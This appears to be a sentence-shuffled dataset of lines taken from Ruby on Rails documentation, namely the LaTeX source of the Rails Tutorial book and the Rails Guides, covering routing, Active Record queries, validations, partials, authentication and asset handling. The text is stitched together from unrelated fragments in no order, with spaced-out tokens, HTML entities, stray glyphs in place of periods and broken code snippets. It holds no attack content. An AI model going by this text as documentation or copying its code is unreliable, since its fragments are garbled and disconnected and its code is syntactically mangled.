When assets are deployed to a cluster , there is no guarantee that the ╼ timestamps will be the same , resulting in different values being used depending ╼ on which server handles the request .
When I originally implemented the checkbox handling in Listing ~ \ ref { code : remember _ me _ ternary } , instead of the correct
To set your ╼ asset host in Rails , you need to set `config ▖ action _ controller ▖ asset _ host` in ╼ `config / production ▖ rb` :
Note here the special line
* Your database : Rails defaults to converting data from your database into UTF-8 ╼ at the boundary ▖
The initial index page for the Users resource ( \ href { http : / / 0 ▖ 0 ▖ 0 ▖ 0 : 3000 / users } { / users } ) .
For example , you cannot do `Client ▖ where ( status : : active ) ` .
&lt; % = f ▖ text _ area : body % &gt;
This creates a user with a different email address from the default .
def valid ? (
Defaults to `-i -t` .
This repeated code is a violation of the important ``Don &apos;t Repeat Yourself &apos; &apos; ( DRY ) principle ; in this section and the next we &apos;ll ``DRY out our code &apos; &apos; by removing the repetition .
Note in particular that fixtures support embedded Ruby , which allows us to use
&#124; &#124; 417 &#124; : expectation _ failed &#124;
Specifically performs these transformations :
To establish the route mapping for the Home page , we \ emph { could } use code like this :
Fortunately , \ kode { : uniqueness } accepts an option , \ kode { : case \ _ sensitive } , for just this purpose ( Listing ~ \ ref { code : validates _ uniqueness _ of _ email _ case _ insensitive } ) .
in Listing ~ \ ref { code : login _ upon _ signup } and
&#124; &#124; 308 &#124; : permanent _ redirect &#124;
Because the \ texttt { will \ _ paginate } gem is in wide use , there &apos;s no need to test it thoroughly , so we &apos;ll take a lightweight approach .
* Rails 4 ▖ 0 has removed `attr _ accessible` and `attr _ protected` feature in favor of Strong Parameters ▖
Active Record Query Interface
Generating a new sample app .
We could now define the \ kode { current \ _ user } method as follows :
Adding some spacing and other universal styling .
In other words , a user starts on a profile page , follows the user , and is immediately redirected back to the original page .
create app
The first critical step is to create a \ emph { data model } for users of our site , together with a way to store that data .
You can configure default headers in `config / application ▖ rb` .
Adding code to test the contents of the Help page .
Application configuration
The updated \ kode { Gemfile } appears in Listing ~ \ ref { code : will _ paginate _ gem } .
class MyMailer &lt; ActionMailer : : Base
The tests look good too .
cattr _ accessor : first _ name , instance _ reader : false
= &gt; # &lt; User id : 1 , name : &quot; Michael Hartl &quot; , email : &quot; mhartl @ example ▖ com &quot; ,
( Note the addition of the magic columns , which weren &apos;t present in the sketch shown in Figure ~ \ ref { fig : user _ model _ sketch } ▖ )
# return the first user
When rendering collections it is also possible to use the ` : layout` option :
As a final step , let &apos;s update our seed data to make the first user an admin by default ( Listing ~ \ ref { code : populator _ with _ admin } ) .
In this application :
Beginning data modeling
In the present case , that point is before the object is saved , so we &apos;ll use a \ kode { before \ _ save } callback to downcase the email attribute before saving the user
Note the use of strong parameters via \ kode { micropost \ _ params } , which permits only the micropost &apos;s \ kode { content } attribute to be modified through the web .
class Invoice &lt; ActiveRecord : : Base
To get started with static pages , we &apos;ll first generate a controller using the same Rails \ kode { generate } script we used in Chapter ~ \ ref { cha : a _ demo _ app } to generate scaffolding .
Taking into account that any object other than \ kode { nil } and \ kode { false } itself is \ kode { true } in a boolean context ( Section ~ \ ref { sec : objects _ and _ message _ passing } ) , the possibilities appear as in Table ~ \ ref { table : user _ and _ and } .
If you choose to use MySQL instead of the shipped SQLite3 database , your `config / database ▖ yml` will look a little different ▖
@ supplier ▖ account = @ account
The method `extract ! ` returns the same subclass of Hash , that the receiver is .
In JavaScript files , Sprockets directives begin with ` / / = ` ▖
&quot; Help &quot;
* How to write effective prose for documentation purposes .
A named module is reachable if it is stored in its corresponding constant ▖
The new signup page at \ href { http : / / 0 ▖ 0 ▖ 0 ▖ 0 : 3000 / signup } { / signup } .
in Listing ~ \ ref { code : installing _ rails } .
# = &gt; emails to me @ email ▖ com .
Create a new initializer at `config / initializers / blorgh ▖ rb` inside the ╼ application where the `blorgh` engine is installed and put this content in it :
In the feature , \ kode { Given } is just a string , but in the step file \ kode { Given } is a \ emph { method } that takes a regular expression and a block .
user 0m7 ▖ 240s
Sun , 15 Aug 2010 23 : 59 : 59 UTC + 00 : 00
as : : item , locals : { title : &quot; Products Page &quot; } % &gt;
* Namespace isolation to `config / routes ▖ rb` :
A partial for a single feed item .
# email : string ( 255 )
When it can &apos;t find it , it will throw ╼ this error ▖
Finally , by including Git , GitHub , and Heroku in the demo examples , the author really gives you a feel for what it &apos;s like to do a real-world project .
Short docs do not need an explicit &quot; Examples &quot; label to introduce snippets ; they just follow paragraphs :
As before , if there was an error updating the ╼ article we want to show the form back to the user .
def initialize ( x , y )
Now that our sample users have both followed user and followers arrays , we need to update the profile page and Home page to reflect this .
Polymorphic Association Diagram &#93; ( images / polymorphic ▖ png )
( Recall from Listing ~ \ ref { code : user _ login _ test _ valid _ information } that \ kode { users ( : michael ) } references the fixture user from Listing ~ \ ref { code : real _ user _ fixture } ▖ )
In the case of the shim partial , this is just the three lines of shim code from Listing ~ \ ref { code : layout _ new _ structure } .
because the reset link puts the email in \ kode { params &#91; : email &#93; } , whereas the latter would put it in \ kode { params &#91; : user &#93; &#91; : email &#93; } .
( The reason for the order of the loops in Listing ~ \ ref { code : sample _ microposts } is to intermix the microposts for use in the status feed ( Section ~ \ ref { sec : the _ status _ feed } ) .
Hello World &quot;
At this point , all the tests should be passing , and the Users resource---with its controller , model , and views---is functionally complete .
The &#91; Rails security policy page &#93; ( http : / / rubyonrails ▖ org / security ) details the procedure to follow for security issues .
# # # # Safe Strings
from Listing ~ \ ref { code : gitignore } to
As with the rule for the root route , this creates two named routes , \ kode { help \ _ path } and \ kode { help \ _ url } :
Note that the CSS in Listing ~ \ ref { code : universal _ css } has a consistent form .
$ RUBYOPT = -W0 bundle exec rake test
as shown in Listing ~ \ ref { code : test _ double _ logout } .
* Pass the file name and specify headers and content and Action Mailer and Mail ╼ will use the settings you pass in .
match &apos; / &apos; = &gt; &apos; root # index &apos; , via : : get
There &apos;s also a special redirect that sends the user back to the page they just came from :
Rails offers three &#91; built-in assertions &#93; ( http : / / api ▖ rubyonrails ▖ org / classes / ActionDispatch / Assertions / RoutingAssertions ▖ html ) designed to make testing routes simpler :
Although we &apos;ve briefly examined the HTML for the form in Figure ~ \ ref { fig : signup _ form } ( shown in Listing ~ \ ref { code : signup _ form _ html } ) , we haven &apos;t yet covered any details , and the form is best understood in the context of \ emph { signup failure } .
Listing ~ \ ref { code : layout _ links _ test } shows how we can use Rails integration tests to translate these steps into code , beginning with the \ kode { assert \ _ template } method to verify that the Home page is rendered using the correct view
In those cases , you may give an options hash a distinguished treatment with `extract _ options !
in Listing ~ \ ref { code : show _ only _ active _ users _ exercise } .
# # # Using a String SQL Fragment
SELECT * FROM clients ORDER BY clients ▖ id ASC LIMIT 1
* * The file name can change between nodes in multi-server environments .
In order to complete the styling , we need just a few more CSS rules , as shown in Listing ~ \ ref { code : remember _ me _ css } .
Use `rake secret` to generate new keys for the `development` and `test` sections .
Date ▖ new ( 2010 , 4 , 30 ) ▖ months _ since ( 2 ) # = &gt; Wed , 30 Jun 2010
EXPLAIN for : SELECT `users` .
An example of this is `ActiveRecord : : Core : : ClassMethods # arel _ table` :
has _ many : todos , primary _ key : : guid
For some ╼ backends you need to specify the queues to listen to .
page to list all users
rest = hash ▖ extract ! ( : a ) ▖ class
cattr _ accessor ( : emulate _ booleans ) { true }
Module ▖ new ▖ anonymous ?
} } ╼ \ end { figure } ╼ ╼ % subsection header ( end ) ╼ ╼ \ subsection { Bootstrap and custom CSS } % ( fold ) ╼ \ label { sec : custom _ css } ╼ ╼
The `group` method supplies an attribute name to group the result set by , using a `GROUP BY` clause in the finder SQL .
id int ( 11 ) NOT NULL auto _ increment ,
The current object and object _ counter variables will be available in the layout as well , the same way they do within the partial .
Use two spaces to indent chunks of code--that is , for markup purposes , two spaces with respect to the left margin ▖
assoc ▖ has _ many : expenses
* `collection ▖ delete ( object , ▖ ▖ ▖ )
# &lt; imported-from-svn type = &quot; boolean &quot; &gt; false &lt; / imported-from-svn &gt;
The practically blank default User test .
Tests still pass ?
cat &lt; file &gt;
Since we will be using email addresses as usernames , this sort of \ kode { find } will be useful when we learn how to let users log in to our site ( Chapter ~ \ ref { cha : sign _ up } ) .
That &apos;s not very useful though , so let &apos;s add the `show` action ╼ before proceeding .
* Enables the Active Record query cache .
You can run EXPLAIN on the queries triggered by relations ▖
( To write more thorough test suites for Ajax-heavy applications , take a look at \ href { http : / / seleniumhq ▖ org / } { Selenium } and \ href { http : / / watir ▖ com / } { Watir } ▖ )
If the above sequence seems implausible , believe me , it isn &apos;t : it can happen on any Rails website with significant traffic .
If the name of the other model cannot be derived from the association name , you can use the ` : class _ name` option to supply the model name ▖
$ bin / rails g model
def campaign _ message ( business , user )
/ / = require jquery
redirect _ to photos _ url
Subsequent pushes can omit the other arguments and write simply
If you need a deep copy of an object , you should use `deep _ dup` ▖
Adding a micropost with a different owner .
redirect _ to @ article
I
The page shown in Figure ~ \ ref { fig : user _ profile _ microposts _ no _ styling } has no micropost-specific styling , so let &apos;s add some ( Listing ~ \ ref { code : micropost _ css } ) and take a look at the resulting pages
mattr _ accessor : warnings _ on _ first _ load
╼ ╼ \ section { Motivation } % ( fold ) ╼ \ label { sec : motivation } ╼ ╼
Fingerprinting is enabled by default for production and disabled for all other ╼ environments ▖
With the class method `File ▖ atomic _ write` you can write to a file in a way that will prevent any reader from seeing half-written content .
This is not typical !
To make these collections , it &apos;s worth knowing about the useful \ kode { \ % w &#91; &#93; } technique for making arrays of strings , as seen in this console session :
This link will allow you to bring up the form that lets you create a new article .
Used in Rails for when the `scaffold` generator is run , but this hook can be used in other generates as well ▖
&lt; % = @ review ▖ title % &gt; &lt; % # fine , escaped if needed % &gt;
class Country &lt; ActiveRecord : : Base
In other words ,
See the \ href { http : / / api ▖ rubyonrails ▖ org / v4 ▖ 2 ▖ 0 ▖ beta4 / classes / ActiveRecord / Callbacks ▖ html } { Rails API entry on callbacks } for more information on which callbacks Rails supports .
They would ╼ be &apos; mass assigned &apos; into your model and then into the database along with the ╼ good stuff - potentially breaking your application or worse .
Having edited the login form , we &apos;re now ready to remember users if they check the checkbox and forget them otherwise .
It returns the date with the same day in the previous or next quarter :
Every partial also has a local variable with the same name as the partial ( minus the underscore ) ▖
&quot; Kurt Gödel &quot; ▖ parameterize # = &gt; &quot; kurt-godel &quot;
You &apos;ll see a bit more complexity here than you did in the controller for ╼ articles ▖
* `config ▖ i18n ▖ enforce _ available _ locales` ensures that all locales passed through i18n must be declared in the `available _ locales` list , raising an `I18n : : InvalidLocale` exception when setting an unavailable locale ▖
t ▖ integer : customer _ id
Editing the profile images is already functional since we &apos;ve outsourced image upload to the Gravatar website ; we can edit Gravatars by clicking on the ``change &apos; &apos; link from Figure ~ \ ref { fig : edit _ page } , as shown in Figure ~ \ ref { fig : gravatar _ cropper } .
The new steps appear in Listing ~ \ ref { code : user _ signout _ test } .
Add the following lines to your application configuration :
Sometimes it &apos;s quick , sometimes it &apos;s slow ▖
The `params` method is the object which ╼ represents the parameters ( or fields ) coming in from the form ▖
Location : / photos / 1
You can also specify an array of paths for `template _ path` , and they ╼ will be searched in order .
d ▖ next _ year # = &gt; Wed , 28 Feb 2001
( clients ▖ first _ name = &apos; Ryan &apos; AND orders ▖ status = &apos; received &apos; )
The method `all _ day` returns a range representing the whole day of the current time .
# &lt; rank type = &quot; integer &quot; &gt; 53 &lt; / rank &gt;
This process is repeated until all of the records have been processed :
Then we &apos;ll comment out the validation , write a failing test , and verify that uncommenting the validation gets the test to pass .
Active Job provides a way to catch exceptions raised during the execution of the ╼ job :
Notice how we switch subjects using the \ kode { subject } method , replacing \ kode { @ user } with \ kode { other \ _ user } , allowing us to test the follower relationship in a natural way :
as seen in Listing ~ \ ref { code : micropost _ factory } .
Moreover , recent additions to Rails ( Section ~ \ ref { sec : adding _ a _ secure _ password } ) make it easy to write a custom authentication system .
xml ▖ channel do
By ╼ default , it will match an optional sign followed by an integral or floating ╼ point number ▖
1234567890 ▖ 506 ▖ to _ s ( : currency , precision : 3 ) # = &gt; $ 1,234,567,890 ▖ 506
This is the first application for the
╼ .
Configure this via `config ▖ action _ dispatch ▖ x _ sendfile _ header` option .
in Listing ~ \ ref { code : sessions _ resource } .
Listing ~ \ ref { code : sidebar _ css } includes the \ kode { ▖ gravatar \ _ edit } class , which we &apos;ll put to work in Chapter ~ \ ref { cha : updating _ showing _ and _ deleting _ users } .
Code for the login form .
class ProcessVideoJob &lt; ActiveJob : : Base
This step is optional , but being a GitHub member will open the door to participating in a wide variety of open-source projects .
# # # Retrieving Multiple Objects in Batches
On the cloud IDE , we can do this as follows
* `uniq`
To pass the object to the partial , we use a hash with value equal to the object and key equal to the desired name of the variable in the partial , which is what the second line in Listing ~ \ ref { code : micropost _ form } accomplishes .
# # # # # Countermeasures
The user profile page \ href { http : / / localhost : 3000 / users / 1 } { / users / 1 } with the default Gravatar ▖ ~ \ href { http : / / railstutorial ▖ org / images / figures / profile _ with _ gravatar _ bootstrap _ 4 _ 0-full ▖ png } { ( full size ) }
method
&#124; HTTP Verb &#124; Path &#124; Controller # Action &#124; Named Helper &#124;
Ruby on Rails has two main sets of documentation : the guides , which help you ╼ learn about Ruby on Rails , and the API , which serves as a reference .
now + 1 ▖ year
For example , `Client ▖ find _ by _ first _ name _ and _ locked ( &quot; Ryan &quot; , true ) ` .
would work as well .
NOTE : Defined in `active _ support / core _ ext / module / introspection ▖ rb` .
&#124; GET &#124; / photos &#124; photos # index &#124; display a list of all photos &#124;
duplicate # = &gt; &#91; &apos; foo &apos; , &apos; another-string &apos; &#93;
private
# # # `remove`
When you create a fresh object , for ╼ example using the `new` method , that object does not belong to the database ╼ yet ▖
However there are a few cases where `atomic _ write` cannot change the file ownership or permissions , this error is caught and skipped over trusting in the user / filesystem to ensure the file is accessible to the processes that need it .
The results appear in Listing ~ \ ref { code : following _ p _ follow _ bang } .
# Returns true if no errors are found , false otherwise .
A lighter-weight and more flexible approach to testing
In Chapter ~ \ ref { cha : sign _ up } , we implemented user signup by making an HTML form that issued an HTTP \ texttt { POST } request to the \ kode { create } action in the Users controller .
SELECT count ( DISTINCT clients ▖ id ) AS count _ all FROM clients
If using the turbolinks gem , which is included by default in Rails 4 , then ╼ include the &apos; data-turbolinks-track &apos; option which causes turbolinks to check if ╼ an asset has been updated and if so loads it into the page :
include M
Note that the \ kode { destroy } method in Listing ~ \ ref { code : microposts _ destroy _ action } redirects to the URL
* How to contribute to the Ruby on Rails documentation .
Since we changed the `author _ class` method to return a `Class` instead of a ╼ `String` , we must also modify our `belongs _ to` definition in the `Blorgh : : Article`
The result appears in Listing ~ \ ref { code : new _ password _ reset } and Figure ~ \ ref { fig : forgot _ password _ form } .
# # # Merging
&amp; &amp; expiration _ date &lt; Date ▖ today
create app / views / microposts / show ▖ html ▖ erb
Similar to the model namespacing , a controller called `ArticlesController` becomes ╼ `Blorgh : : ArticlesController` and the views for that controller will not be at ╼ `app / views / articles` , but `app / views / blorgh / articles` instead ▖
# # # `many ?
On the other hand , many beginning Rails developers are excited about making \ emph { web } applications , and would rather not slog through a 500-page book on pure Ruby before ever writing a single web page .
# # # Deleting Articles
counter _ cache : true
( Compare to the email uniqueness index from Listing ~ \ ref { code : email _ uniqueness _ index } and the multiple-key index in Listing ~ \ ref { code : micropost _ migration } ▖ )
Most pull requests will go through a few iterations before they get merged ▖ ╼
Now we &apos;ll create a second user by revisiting the \ href { http : / / 0 ▖ 0 ▖ 0 ▖ 0 : 3000 / users / new } { \ texttt { new } } page and submitting a second set of user information ; the resulting user \ href { http : / / 0 ▖ 0 ▖ 0 ▖ 0 : 3000 / users } { \ texttt { index } } is shown in Figure ~ \ ref { fig : demo _ user _ index _ two _ rails _ 3 } .
You will need to use :
The `link _ to` method is one of Rails &apos; built-in view helpers ▖
The `collection ▖ delete` method removes one or more objects from the collection by setting their foreign keys to `NULL` .
This will automatically link the comment so that it belongs to ╼ that particular article .
# equivalent to Time ▖ current ▖ advance ( months : 1 )
params ▖ require ( : article ) ▖ permit ( : title , : text , : author _ name )
Within the `app / assets` directory , there are the `images` , `javascripts` and ╼ `stylesheets` directories which , again , you should be familiar with due to their ╼ similarity to an application ▖
`root &apos; welcome # index &apos; ` tells Rails to map requests to the root of the ╼ application to the welcome controller &apos;s index action and `get &apos; welcome / index &apos; ` ╼ tells Rails to map requests to &lt; http : / / localhost : 3000 / welcome / index &gt; to the ╼ welcome controller &apos;s index action ▖
# # # `to _ s`
beginning _ of _ day ( midnight , at _ midnight , at _ beginning _ of _ day )
( Compare to Table ~ \ ref { table : demo _ RESTful _ users } ▖ )
* `config ▖ active _ record ▖ default _ timezone` determines whether to use `Time ▖ local` ( if set to ` : local` ) or `Time ▖ utc` ( if set to ` : utc` ) when pulling dates and times from the database ▖
If you decide to use Sublime Text , you might want to follow the optional setup instructions for \ href { https : / / github ▖ com / mhartl / rails _ tutorial _ sublime _ text } { Rails Tutorial Sublime Text }
The `collection ▖ exists ? ` method checks whether an object meeting the supplied ╼ conditions exists in the collection ▖
A mockup of the proto-feed with micropost delete links .
Enables the use of time calculations and declarations , like `45 ▖ minutes + 2 ▖ hours + 4 ▖ years` .
To get the failing test to pass , instead of \ kode { flash } we use \ kode { flash ▖ now } , which is specifically designed for displaying flash messages on rendered pages ; unlike the contents of \ kode { flash } , its contents disappear as soon as there is an additional request .
in Listing ~ \ ref { code : delete _ link _ tests } .
Rails &apos; sanitize ( ) method does a good job to fend off encoding attacks .
t ▖ references : manager
The `select` method lets you override the SQL `SELECT` clause that is used to retrieve data about the associated objects ▖
* Rails 4 ▖ 0 has deprecated the old-style hash based finder API ▖ This means that ╼ methods which previously accepted &quot; finder options &quot; no longer do ▖
In this chapter we &apos;ll learn how .
in Listing ~ \ ref { code : stylesheets _ partial } .
The last example uses the useful \ kode { inspect } method , which returns a string with a literal representation of the object it &apos;s called on :
This is because Rails automatically infers the class name from the association name ▖
An emphasis on HTTP verbs is typical of web frameworks ( including Rails ) influenced by the \ emph { REST architecture } , which we saw briefly in Chapter ~ \ ref { cha : a _ demo _ app } and will start learning about more in Chapter ~ \ ref { cha : sign _ up } .
% w ( a b c d ) ▖ prepend ( &apos; e &apos; ) # = &gt; % w ( e a b c d )
We simply issue the correct request to each action and confirm that the micropost count is unchanged and the result is redirected to the login URL , as seen in Listing ~ \ ref { code : create _ destroy _ micropost _ tests } .
( The code in Listing ~ \ ref { code : db _ seed } is a bit advanced , so don &apos;t worry too much about the details ▖ )
A summary of the data model for users appears in Figure ~ \ ref { fig : demo _ user _ model } .
In Chapter ~ \ ref { cha : account _ activation _ and _ password _ reset } , we &apos;ll add two additional refinements : an account activation link for newly registered users ( verifying a valid email address in the process ) and password resets to help users who forget their passwords .
Then , upon reloading the user show page , the flash message disappears as promised ( Figure ~ \ ref { fig : signup _ flash _ reloaded } ) .
No signing in
By default tracks everything on autoload paths and is set to true ▖
&quot; hello &quot; ▖ at ( 4 ) # = &gt; &quot; o &quot;
block ▖ call
The next line can be a bit confusing but is fairly common in idiomatic Rails programming :
Indeed , the technique is exactly the same as for user following , with the roles of \ kode { follower \ _ id } and \ kode { followed \ _ id } reversed .
You should use `app / assets` for ╼ files that must undergo some pre-processing before they are served .
We start by generating a test as usual :
The Home page after deleting the second-most-recent micropost .
In particular , the asset pipeline combines all the application stylesheets into one CSS file ( \ kode { application ▖ css } ) , combines all the application JavaScript into one JavaScript file ( \ kode { application ▖ js } ) , and then \ emph { minifies } them to remove the unnecessary spacing and indentation that bloats file size .
First-time system setup
To do that , you &apos;ll modify ╼ `app / views / articles / new ▖ html ▖ erb` to check for error messages :
Supposing we use the same ` _ box` partial from above , this would produce the same output as the previous example .
* ` _ form ▖ html ▖ erb`
If you still find this tutorial too difficult , you might try starting with \ href { http : / / learn-rails ▖ com / } { \ emph { Learn Ruby on Rails } } by Daniel Kehoe or \ href { http : / / mbsy ▖ co / 7Zdc7 } { One Month Rails } , both of which are geared more toward complete beginners than the \ emph { Ruby on Rails Tutorial } .
NOTE : Defined in `active _ support / core _ ext / string / indent ▖ rb` .
Generating a StaticPages controller .
As you might guess , such files allow us to mix JavaScript and embedded Ruby to perform actions on the current page .
Because we won &apos;t need fixtures until Chapter ~ \ ref { cha : log _ in _ log _ out } , for now we &apos;ll just remove them , leaving an empty fixtures file ( Listing ~ \ ref { code : empty _ fixtures } ) .
Rails allows us to define custom routing rules , thereby providing named routes .
The Home page with status feed and incremented following count .
Set it to &apos; 0 ; &apos; if you want to switch XSS Auditor off ( useful if response contents scripts from request parameters )
get &apos; search &apos; , on : : collection
Hello , Rails !
require &apos; active _ support / all&apos;
The purpose of a feed is to pull out the microposts whose user ids correspond to the users being followed by the current user ( and the current user itself ) , as indicated by the arrows in the diagram .
# # # `errors &#91; &#93; `
get &apos; photos / * other &apos; , to : &apos; photos # unknown&apos;
One technique for maintaining the user signin status is to use a traditional Rails session ( via the special \ kode { session } function ) to store a \ emph { remember token } equal to the user &apos;s id :
By default , the console starts in a \ emph { development environment } , which is one of three separate environments defined by Rails ( the others are \ emph { test } and \ emph { production } ) .
This change does require that the engine is run from a Rails application that ╼ has an `ApplicationController` .
* Mailer Filters abort further processing if body is set to a non-nil value .
This particular \ kode { initialize } takes one argument , \ kode { attributes } :
Pretty sweet ▖ )
Click ``Create &apos; &apos;
= &gt; &#91; 2 , 3 , 4 , 5 , 6 , 7 , 8 , 9 &#93;
All that is needed to complete the authentication functionality is to restrict access to pages based on login status and user identity .
# No last _ name = instance writer is generated .
First , we try to save the user ; if the save succeeds , the user &apos;s information gets written to the database automatically , and we then \ emph { redirect } the browser to show the user &apos;s profile ( together with a friendly greeting ) , as mocked up in Figure ~ \ ref { fig : signup _ success _ mockup } .
Here we check that the followed user count goes down by ~ 1 and include the relationship and followed user &apos;s id :
my _ hash = { &apos; first &apos; = &gt; 1 , &apos; second &apos; = &gt; &apos; two &apos; , &apos; third &apos; = &gt; &#91; 1,2,3 &#93; }
Anything that can be chopped up ╼ into small units of work and run in parallel , really .
Unfortunately , RVM and rbenv can &apos;t be used on the same system simultaneously , and since I &apos;ve been using RVM longer that &apos;s the one I use in this tutorial .
This means adding a second user to our users fixture file , as shown in Listing ~ \ ref { code : fixture _ second _ user } .
Ordering
Navigate to the Rails &#91; GitHub repository &#93; ( https : / / github ▖ com / rails / rails ) and press &quot; Fork &quot; in the upper right hand corner .
That is , `Date ▖ new ( 1582 , 10 , 4 ) ▖ tomorrow` returns `Date ▖ new ( 1582 , 10 , 15 ) ` and so on ▖
created _ at : &quot; 2013-03-11 00 : 57 : 46 &quot; , updated _ at : &quot; 2013-03-11 00 : 57 : 46 &quot; &gt; ,
# = &gt; Mon , 29 Mar 2010 00 : 00 : 00 + 0000
Note that we write the commit message in the \ emph { present } tense ( and , technically speaking , the \ href { http : / / en ▖ wikipedia ▖ org / wiki / Imperative _ mood } { imperative mood } ) .
See &#91; # 16526 &#93; ( https : / / github ▖ com / rails / rails / pull / 16526 ) for more details .
Appending paths to this configuration option will cause those paths to be used in the search for assets .
Another common use is in a function &apos;s return value :
route resources : users
You can also specify a second partial to be rendered between instances of the main partial by using the ` : spacer _ template` option :
\ kode { lib / assets } : assets for libraries written by your dev team
client = Client ▖ take
At this point , our application---with an important caveat---enforces email uniqueness , and our test suite should pass .
( Experience shows that this is a wise practice ▖ )
We &apos;ll start by adding a few microposts with different owners to the micropost fixtures , as shown in Listing ~ \ ref { code : add _ micropost _ different _ owner } .
{ foo : &apos; bar &apos; }
The result appears in Listing ~ \ ref { code : new _ password _ reset }
We took care of the first route in Section ~ \ ref { sec : setting _ the _ root _ route } , and we &apos;ll have implemented all but the last one by the end of this chapter .
class MyValidator &lt; ActiveModel : : Validator
This is a generally good practice , as it opens up the possibility of manipulating individual microposts at a future date ( using JavaScript , for example ) .
Browsers request pages from Rails by making a request for a URL using a specific HTTP method , such as `GET` , `POST` , `PATCH` , `PUT` and `DELETE` ▖
( \ kode { mv } is a Unix command ; on Windows you may need to rename the file using the file browser or the \ kode { rename } command ▖ )
A text editor / command line development environment ▖ \ href { http : / / railstutorial ▖ org / images / figures / editor _ shell-full ▖ png } { ( full size ) }
@ msg = &quot; No customer found for this order &quot;
Welcome to the \ href { http : / / ruby ▖ railstutorial ▖ org / ruby-on-rails-tutorial-book } { \ emph { Ruby on Rails Tutorial } } .
It &apos;s worth noting that the \ kode { nil } object is special , in that it is the \ emph { only } Ruby object that is false in a boolean context , apart from \ kode { false } itself .
The signup view with partial .
( The only really important one is the change to strong parameters ; the others are all relatively minor ▖ )
At this point , you might expect application code as in Section ~ \ ref { sec : user _ micropost _ associations } , and it &apos;s similar , but there are two key differences .
&quot; Symbol &quot; = &gt; &quot; symbol &quot; ,
The options accepted by the assets cache store are the same as the application &apos;s
Then you can completely change what ╼ this view would normally output .
If you &apos;ve noticed that \ kode { followed \ _ id } also identifies a user , and are concerned about the asymmetric treatment of followed and follower , you &apos;re ahead of the game .
Furthermore , if you use the Rails form helpers to generate your forms , when ╼ a validation error occurs on a field , it will generate an extra ` &lt; div &gt; ` around ╼ the entry .
Consequently , the inner \ kode { if } conditional will be evaluated :
* `initialize _ logger` Initializes the logger ( an `ActiveSupport : : Logger` object ) for the application and makes it accessible at `Rails ▖ logger` , provided that no initializer inserted before this point has defined `Rails ▖ logger` .
NewsMailer ▖ weekly ( user ) ▖ deliver _ now
Validating the uniqueness of email addresses ▖
# with try
We see here that Ruby uses square brackets to access array elements .
INNER JOIN guests ON guests ▖ comment _ id = comments ▖ id
* `integration _ tool` defines which integration tool to use ▖
Moreover , they suffer from terrible duplication :
Ruby has a large number of methods for manipulating strings of characters .
The ``forgot password &apos; &apos; form for an invalid email address .
* Fire the SQL query and retrieve the corresponding results from the database .
@ customer ▖ destroy
# Push Rack : : BounceFavicon at the bottom
This method is similar in purpose to `Kernel # Array` , but there are some differences :
The option ` : children` allows you to set these node names .
Double-click on the \ kode { ▖ gitignore } file ( Figure ~ \ ref { fig : gitignore } ) to open it , and then fill it with the contents of Listing ~ \ ref { code : gitignore _ spring } .
Example object structure for use with this method :
\ emph { Hint : } Search the web ; you should find one particularly robust method involving something called \ kode { \ _ blank } .
The \ kode { create } action in Listing ~ \ ref { code : initial _ create _ session } does nothing but render the \ kode { new } view , but it &apos;s enough to get us started .
&#124; GET &#124; / sekret / comments / : id / edit ( ▖ : format ) &#124; comments # edit &#124; edit _ comment _ path &#124;
The resulting page is shown in Figure ~ \ ref { fig : user _ show _ sidebar _ css } .
We &apos;ve said before that everything in Ruby is an object , and in this section we &apos;ll finally get to define some of our own .
The `assert _ routing` assertion checks the route both ways : it tests that the path generates the options , and that the options generate the path ▖
puts &lt; &lt; -USAGE ▖ strip _ heredoc
cattr _ accessor : emulate _ booleans
We can add a secure password to a model using the built-in \ kode { has \ _ secure \ _ password } method .
Note the \ kode { method : : delete } argument , which arranges for the link to issue the necessary \ texttt { DELETE } request ▖ We &apos;ve also wrapped each link inside an ~ \ kode { if } statement so that only admins can see them .
@ order = @ customer ▖ orders ▖ create ( order _ date : Time ▖ now )
scope : published _ and _ commented , - &gt; { published ▖ where ( &quot; comments _ count &gt; 0 &quot; ) }
╼ $ ps aux &#124; grep spring ╼ ubuntu 12241 0 ▖ 3 0 ▖ 5 589960 178416 ?
Using ╼ `JSON ▖ generate` and `JSON ▖ dump` inside a Rails application could produce ╼ unexpected errors .
-------------------
These actions will perform CRUD operations on the articles ╼ within our system .
Each finder method allows you to pass arguments into it to perform certain queries on your database without writing raw SQL .
The format for this ╼ template can only be `html` and the handler must be one of `erb` , `builder` or ╼ `coffee` ▖
Our strategy for handling account activation parallels user login \ linebreak ( Section ~ \ ref { sec : logging _ in } ) and especially remembering users ( Section ~ \ ref { sec : remember _ me } ) .
In some applications , this initial implementation might be good enough for most practical purposes .
Putting the variable directly into the conditions string will pass the variable to the database * * as-is * * ▖
2 files changed , 5 insertions ( + ) , 243 deletions ( - )
is referenced as :
The Home page with a title .
In this section , we &apos;ll add the \ href { http : / / www ▖ dictionary ▖ com / browse / penultimate } { penultimate } user action , the \ kode { index } action , which is designed to display \ emph { all } the users instead of just one .
&#124; GET &#124; / photos / : id &#124; photos # show &#124; display a specific photo &#124;
By using an email address as the username , we open the possibility of communicating with our users at a future date ( Chapter ~ \ ref { cha : account _ activation _ and _ password _ resets } ) .
By default the asset pipeline will check for potential errors in development mode during ╼ runtime ▖
To keep it simple in this case , the application will have a class called `User` ╼ that represents the users of the application ( we &apos;ll get into making this ╼ configurable further on ) ▖
t ▖ text : text
as shown in Listing ~ \ ref { code : new _ session _ tests } .
adapter : postgresql
* `create !
The sample application Home page with debug information .
But then , when it &apos;s time to send a response back to the user , the Controller hands things off to the View ▖
&lt; script src = &quot; / assets / projects ▖ js ?
and write some CoffeeScript like this :
&#91; &#93; ▖ from ( 0 ) # = &gt; &#91; &#93;
The typical first step when making a web application is to create a \ emph { data model } , which is a representation of the structures needed by our application .
As noted in Table ~ \ ref { table : shortcuts } , you can even leave off \ kode { install } , as the \ kode { bundle } command by itself is an alias for \ kode { bundle install } .
} )
@ part ▖ assemblies &lt; &lt; @ assembly1
Another way to do this is using ` &#91; &#93; = ` setter
* ` : restrict _ with _ error` causes an error to be added to the owner if there is an associated object
\ href { https : / / pragmaticstudio ▖ com / refs / railstutorial } { Pragmatic Studio } : Online Ruby and Rails courses from Mike and Nicole Clark .
The point of the \ kode { home } action , as we saw in Chapter ~ \ ref { cha : static _ pages } , is to render a web page , not to return a value .
You &apos;ll learn more about layouts and how to use them later in this guide .
* Note that `where ( ▖ ▖ ▖ ) ` returns a relation , not an array like the old finders ▖
The Micropost data model .
The user \ kode { create } action with a save and a redirect .
The Micropost migration .
For example , let &apos;s define a function \ kode { string \ _ message } that takes a single \ emph { argument } and returns a message based on whether the argument is empty or not :
